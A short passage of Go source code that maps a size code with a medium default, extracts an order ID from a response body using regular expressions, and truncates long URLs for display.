	if code, ok := sizeMap[sizeUpper]; ok {
		return "0" + code
	}
	
	// Default to Medium if unknown
	return "000M000"
}

func extractOrderIDFromResponse(body string) string {
	// Try various patterns to extract order ID
	patterns := []string{
		`order[_-]?id[\":\s]+([A-Z0-9-]+)`,
		`order[_-]?number[\":\s]+([A-Z0-9-]+)`,
		`\"id\":\s*\"([A-Z0-9-]+)\"`,
	}
	
	for _, pattern := range patterns {
		re := regexp.MustCompile(pattern)
		matches := re.FindStringSubmatch(body)
		if len(matches) > 1 {
			return matches[1]
		}
	}
	
	return ""
}

func truncateURL(url string) string {
	if len(url) > 60 {
		return url[:57] + "..."
	}
	return url
}